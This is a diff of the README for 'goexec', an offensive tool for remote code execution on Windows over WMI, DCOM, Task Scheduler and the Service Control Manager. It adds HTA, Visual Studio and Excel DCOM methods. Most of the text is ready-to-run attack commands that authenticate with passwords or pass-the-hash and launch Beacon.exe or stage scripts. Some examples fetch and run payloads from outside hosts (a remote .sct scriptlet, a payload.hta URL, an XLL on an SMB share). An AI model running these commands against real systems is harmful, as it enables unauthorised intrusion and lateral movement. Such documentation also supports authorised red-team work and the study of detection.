@@ -31,7 +31,7 @@ cd goexec
 CGO_ENABLED=0 go build -ldflags="-s -w"
 
 # (Optional) Install goexec to /usr/local/bin/goexec
-sudo install ./goexec /usr/local/bin
+sudo install goexec /usr/local/bin
 ```
 
 ### Install with Docker
@@ -94,8 +94,8 @@ Authentication:
 
 ### Fetching Remote Process Output
 
-Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o`/`--output` flag.
-Use of this flag will wrap the supplied command in `cmd.exe /c ... > \Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
+Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o`/`--out` flag.
+Use of this flag will wrap the supplied command in `cmd.exe /c... >\Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
 By default, the output collection will time out after 1 minute, but this can be adjusted with the `--out-timeout` flag.
 
 
@@ -148,13 +148,13 @@ Execution:
 
 ```shell
 # Run an executable without arguments
-./goexec wmi proc "$target" \
+goexec wmi proc "$target" \
   -u "$auth_user" \
   -p "$auth_pass" \
   -e 'C:\Windows\Temp\Beacon.exe' \
 
 # Authenticate with NT hash, fetch output from `cmd.exe /c whoami /all`
-./goexec wmi proc "$target" \
+goexec wmi proc "$target" \
   -u "$auth_user" \
   -H "$auth_nt" \
   -e 'cmd.exe' \
@@ -183,7 +183,7 @@ WMI:
 
 ```shell
 # Call StdRegProv.EnumKey - enumerate registry subkeys of HKLM\SYSTEM
-./goexec wmi call "$target" \
+goexec wmi call "$target" \
     -u "$auth_user" \
     -p "$auth_pass" \
     -C 'StdRegProv' \
@@ -193,10 +193,11 @@ WMI:
 
 ### DCOM Module (`dcom`)
 
-The `dcom` module uses exposed Distributed Component Object Model (DCOM) objects to spawn processes.
+The `dcom` module uses exposed Distributed Component Object Model (DCOM) objects to gain remote execution.
 
 > [!WARNING]
 > The DCOM module is generally less reliable than other modules because the underlying methods are often reliant on the target Windows version and specific Windows settings.
+> Additionally, Kerberos auth is not officially supported by the DCOM module, but kudos if you can get it to work.
 
 ```text
 Usage:
@@ -206,6 +207,9 @@ Available Commands:
   mmc                Execute with the MMC20.Application DCOM object
   shellwindows       Execute with the ShellWindows DCOM object
   shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
+  htafile            Execute with the HTAFile DCOM object
+  excel              Execute with DCOM object(s) targeting Microsoft Excel
+  visualstudio       Execute with DCOM object(s) targeting Microsoft Visual Studio
 
 ... [inherited flags] ...
 
@@ -244,7 +248,7 @@ Execution:
 
 ```shell
 # Authenticate with NT hash, fetch output from `cmd.exe /c whoami /priv` to file
-./goexec dcom mmc "$target" \
+goexec dcom mmc "$target" \
   -u "$auth_user" \
   -H "$auth_nt" \
   -e 'cmd.exe' \
@@ -284,7 +288,7 @@ The app window argument (`--app-window`) must be one of the values described [he
 
 ```shell
 # Authenticate with local admin NT hash, execute `netstat.exe -anop tcp` w/ output
-./goexec dcom shellwindows "$target" \
+goexec dcom shellwindows "$target" \
   -u "$auth_user" \
   -H "$auth_nt" \
   -e 'netstat.exe' \
@@ -292,7 +296,7 @@ The app window argument (`--app-window`) must be one of the values described [he
   -o- # write to standard output
 
 # Authenticate with local admin password, open maximized notepad window on desktop
-./goexec dcom shellwindows "$target" \
+goexec dcom shellwindows "$target" \
   -u "$auth_user" \
   -p "$auth_pass" \
   -e 'notepad.exe' \
@@ -326,17 +330,190 @@ Execution:
 
 ```shell
 # Authenticate with NT hash, open explorer.exe maximized
-./goexec dcom shellbrowserwindow "$target" \
+goexec dcom shellbrowserwindow "$target" \
   -u "$auth_user@$domain" \
   -H "$auth_nt" \
   -e 'explorer.exe' \
   --app-window 3
 ```
 
+#### `htafile` Method (`dcom htafile`)
+
+The `htafile` method uses the exposed HTML Application object to call [`IPersistMoniker.Load`](https://learn.microsoft.com/en-us/previous-versions/aa458529(v=msdn.10)) with a client-supplied [URL moniker](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-oshared/4948a119-c4e4-46b6-9609-0525118552e8). The URL can point to a URL of any format supported by `mshta.exe`.
+
+```text
+Usage:
+  goexec dcom htafile [target] [flags]
+
+Execution:
+  -U, --url URL                Load custom URL
+      --js string              Execute JavaScript one-liner
+      --vbs string             Execute VBScript one-liner
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Execute `net user` + print output
+goexec dcom htafile "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --command 'net user' \
+  --out -
+
+# Execute blind WSH JavaScript one-liner using admin NT hash
+goexec dcom htafile "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  --js 'GetObject("script:http://10.0.0.10:8001/stage.sct").Exec();close()'
+
+# Execute remote HTA file using admin NT hash
+goexec dcom htafile "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  --url "http://callback.lan/payload.hta"
+```
+
+#### Visual Studio `ExecuteCommand` Method (`dcom visualstudio dte`)
+
+The `visualstudio dte` method uses the exposed `VisualStudio.DTE` object to spawn a process via the `ExecuteCommand` method.
+This method requires that the remote host has Microsoft Visual Studio installed.
+
+```text
+Usage:
+  goexec dcom visualstudio dte [target] [flags]
+
+Visual Studio:
+      --vs-2019             Target Visual Studio 2019
+      --vs-command string   Visual Studio DTE command to execute
+      --vs-args string      Visual Studio DTE command arguments
+
+Execution:
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+```
+
+##### Examples
+
+```shell
+# Execute `sc query` (batch) + save output to services.txt
+goexec dcom visualstudio dte "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --command 'sc query' -o services.txt
+
+# Execute `cmd.exe /c set` with output, target Visual Studio 2019
+goexec dcom visualstudio dte "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --vs-2019 \
+  --exec 'cmd.exe' \
+  --args '/c set' -o-
+```
+
+#### Excel Methods (`dcom excel`)
+
+The `dcom excel` command group contains remote execution methods targeting Microsoft Excel.
+Each of these methods assume that the remote host has Excel installed.
+
+```text
+Usage:
+  goexec dcom excel [command] [flags]
+
+Available Commands:
+  macro       Execute using Excel 4.0 macros (XLM)
+  xll         Execute by Loading an XLL add-in
+
+... [inherited flags] ...
+```
+
+#### Excel `ExecuteExcel4Macro` Method (`dcom excel macro`)
+
+The `excel macro` method uses the exposed `Excel.Application` DCOM object to call [`ExecuteExcel4Macro`](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro) with an arbitrary Excel 4.0 macro.
+An Excel installation must be present on the remote host for this method to work.
+
+```text
+Usage:
+  goexec dcom excel macro [target] [flags]
+
+Execution:
+  -M, --macro string           XLM macro
+      --macro-file file        XLM macro file
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Execute `query session` + print output
+goexec dcom excel macro "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --command 'query session' -o-
+
+# Use admin NT hash to directly call a Win32 API procedure via XLM
+goexec dcom excel macro "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","bryan was here",0)'
+```
+
+#### (Auxiliary) Excel `RegisterXLL` Method (`dcom excel xll`)
+
+The `xll` method uses the exposed Excel.Application DCOM object to call RegisterXLL, thus loading a XLL/DLL from the remote filesystem or an UNC path.
+This method requires that the remote host has Microsoft Excel installed.
+
+```text
+Usage:
+  goexec dcom excel xll [target] [flags]
+
+Execution:
+      --xll path   XLL/DLL local or UNC path
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Use admin password to execute XLL/DLL from an uploaded file
+goexec dcom excel xll "$target" \
+  --user "${auth_user}" \
+  --nt-hash "$auth_nt" \
+  --xll 'C:\Users\localuser\Desktop\file.xll'
+
+# Use admin NT hash to execute XLL/DLL from an SMB share
+goexec dcom excel xll "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  --xll '\\smbserver.lan\share\addin.xll'
+```
+
 ### Task Scheduler Module (`tsch`)
 
 The `tsch` module makes use of the Windows Task Scheduler service ([MS-TSCH](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/)) to spawn processes on the remote target.
-
 ```text
 Usage:
   goexec tsch [command] [flags]
@@ -393,7 +570,7 @@ Execution:
 # Authenticate with NT hash via Kerberos, 
 #   register task at \Microsoft\Windows\GoExec,
 #   execute `C:\Windows\Temp\Beacon.exe`
-./goexec tsch create "$target" \
+goexec tsch create "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
   --dc "$dc_ip" \
@@ -404,7 +581,7 @@ Execution:
 # Authenticate using Kerberos AES key,
 #   execute `C:\Windows\Temp\Seatbelt.exe -group=system`,
 #   collect output with lengthened (5 minute) timeout
-./goexec tsch create "$target" \
+goexec tsch create "$target" \
   --user "${auth_user}@${domain}" \
   --dc "$dc_ip" \
   --aes-key "$auth_aes" \
@@ -441,7 +618,7 @@ Execution:
 
 ```shell
 # Use random task name, execute `notepad.exe` on desktop session 1
-./goexec tsch demand "$target" \
+goexec tsch demand "$target" \
   --user "$auth_user" \
   --password "$auth_pass" \
   --exec 'notepad.exe' \
@@ -450,7 +627,7 @@ Execution:
 # Authenticate with NT hash via Kerberos,
 #   register task at \Microsoft\Windows\GoExec (will be deleted),
 #   execute `C:\Windows\System32\cmd.exe /c set` with output
-./goexec tsch demand "$target" \
+goexec tsch demand "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
   --dc "$dc_ip" \
@@ -491,7 +668,7 @@ Execution:
 
 ```shell
 # Enable debug logging, Modify "\Microsoft\Windows\UPnP\UPnPHostConfig" to run `cmd.exe /c whoami /all` with output
-./goexec tsch change $target --debug \
+goexec tsch change $target --debug \
   -u "${auth_user}" \
   -p "${auth_pass}" \
   -t '\Microsoft\Windows\UPnP\UPnPHostConfig' \
@@ -594,7 +771,7 @@ Execution:
 
 ```shell
 # Used named pipe transport, Modify the PlugPlay service to execute `C:\Windows\System32\cmd.exe /c C:\Windows\Temp\stage.bat`
-./goexec scmr change $target \
+goexec scmr change $target \
   -u "$auth_user" \
   -p "$auth_pass" \
   -F "ncacn_np:" \
